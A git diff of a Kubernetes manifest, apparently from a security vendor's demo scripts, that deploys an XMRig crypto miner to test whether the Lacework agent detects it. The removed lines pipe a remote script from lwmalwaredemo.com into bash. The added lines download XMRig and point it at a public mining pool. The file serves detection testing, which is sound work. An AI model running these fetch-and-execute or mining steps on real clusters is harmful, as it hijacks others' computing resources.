@@ -1,4 +1,5 @@
 # Deploys a crypto miner malware example for testing the Lacework agent
+# Note: This will only work on Kubernetes clusters running on Intel based platforms.
 # Run the following command to deploy the example
 # kubectl apply -f https://raw.githubusercontent.com/lacework-dev/scripts/main/k8s-crypto-miner.yaml
 # Run the following command to delete the example
@@ -20,10 +21,31 @@ spec:
         app: crypto-miner
     spec:
       containers:
-      - image: ubuntu:latest
+      - image: ubuntu:18.04
         name: crypto-miner
-        resources:
-          limits:
-            cpu: "1"
-        command: ["/bin/bash"]
-        args: ['-c', 'apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)' ]
+        command:
+        - /bin/sh
+        - -c
+        - |
+          echo Tada
+          apt update
+          apt install -y curl
+          curl -L https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz -o xmrig.tar.gz --silent
+          tar xvfz xmrig.tar.gz
+          cd xmrig-6.19.2
+          config='{
+          "algo": "cryptonight",
+          "pools": [
+              {
+                  "url": "xmrpool.eu:9999",
+                  "user": "NOTAREALUSER",
+                  "pass": "x",
+                  "enabled": true,
+              }
+          ],
+          "retries": 10,
+          "retry-pause": 3,
+          "watch": true
+          }'
+          echo $config > config.json
+          ./xmrig -c config.json
